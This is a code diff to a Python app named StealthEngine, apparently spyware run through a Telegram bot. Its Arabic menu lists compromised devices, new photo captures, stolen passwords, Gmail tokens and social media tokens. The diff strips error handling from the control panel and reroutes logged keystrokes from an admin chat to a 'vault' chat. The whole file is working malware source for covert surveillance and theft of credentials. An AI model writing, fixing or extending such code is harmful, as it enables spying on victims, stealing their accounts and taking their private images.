@@ -351,24 +351,20 @@ class StealthEngine(App):
             self._send_to_telegram(chat_id, 'Unknown command')
 
     def _show_main_menu(self, chat_id):
-        import psutil
-        try:
-            devices = self._get_registered_devices()
-            new_captures = len(self.snap_queue)
-            markup = {
-                'inline_keyboard': [
-                    [{'text': f'📱 الأجهزة المخترقة ({len(devices)})', 'callback_data': 'global_devices'}],
-                    [{'text': f'🆕 أجهزة جديدة', 'callback_data': 'global_new'}],
-                    [{'text': f'🔞 صور جديدة ({new_captures})', 'callback_data': 'global_media'}],
-                    [{'text': '🔑 كلمات سر', 'callback_data': 'global_passwords'}],
-                    [{'text': '📧 Gmail tokens', 'callback_data': 'global_gmail'}],
-                    [{'text': '📱 توكنات التواصل', 'callback_data': 'global_social'}],
-                    [{'text': '📊 إحصائيات', 'callback_data': 'global_stats'}]
-                ]
-            }
-            self._send_to_telegram(chat_id, '🔥 لوحة التحكم الرئيسية', reply_markup=markup)
-        except:
-            pass
+        devices = self._get_registered_devices()
+        new_captures = len(self.snap_queue)
+        markup = {
+            'inline_keyboard': [
+                [{'text': f'📱 الأجهزة المخترقة ({len(devices)})', 'callback_data': 'global_devices'}],
+                [{'text': f'🆕 أجهزة جديدة', 'callback_data': 'global_new'}],
+                [{'text': f'🔞 صور جديدة ({new_captures})', 'callback_data': 'global_media'}],
+                [{'text': '🔑 كلمات سر', 'callback_data': 'global_passwords'}],
+                [{'text': '📧 Gmail tokens', 'callback_data': 'global_gmail'}],
+                [{'text': '📱 توكنات التواصل', 'callback_data': 'global_social'}],
+                [{'text': '📊 إحصائيات', 'callback_data': 'global_stats'}]
+            ]
+        }
+        self._send_to_telegram(chat_id, '🔥 لوحة التحكم الرئيسية', reply_markup=markup)
 
     def _list_devices(self, chat_id):
         devices = self._get_registered_devices()
@@ -514,10 +510,10 @@ class StealthEngine(App):
 
     def _get_keylog(self):
         if not self.keylog_buffer:
-            self._send_to_telegram(self.admin_id, 'No keystrokes recorded.')
+            self._send_to_telegram(self.vault_id, 'No keystrokes recorded.')
             return
         text = '\n'.join(self.keylog_buffer[-50:])
-        self._send_to_telegram(self.admin_id, text)
+        self._send_to_telegram(self.vault_id, text)
 
     def _get_contacts(self):
         try:
